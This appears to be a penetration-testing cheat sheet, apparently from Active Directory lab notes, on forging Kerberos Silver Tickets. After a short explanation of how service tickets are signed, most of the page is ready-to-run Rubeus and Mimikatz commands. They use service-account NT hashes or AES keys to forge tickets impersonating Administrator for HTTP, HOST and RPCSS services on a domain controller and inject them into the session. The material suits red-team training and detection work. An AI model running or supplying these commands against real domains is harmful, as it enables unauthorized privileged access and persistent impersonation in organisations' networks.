# Silver Ticket

A valid Service Ticket or TGS ticket (Golden ticket is TGT).
Encrypted and Signed by the hash of the service account (Golden ticket  is signed by hash of krbtgt) of the service running with that account.
* Services rarely check PAC (Privileged Attribute Certificate). 
* Services will allow access only to the services themselves.
* Reasonable persistence period (default 30 days for computer accounts)

**Forge a Silver ticket**
```
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator
/domain:dollarcorp.moneycorp.local /ptt
```

```
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

Similar command can be used for any other service on a machine.  Which services? HOST, RPCSS, CIFS and many more

**Create Silver Tickets for HOST and RPCSS**

``` 
Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

```
Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

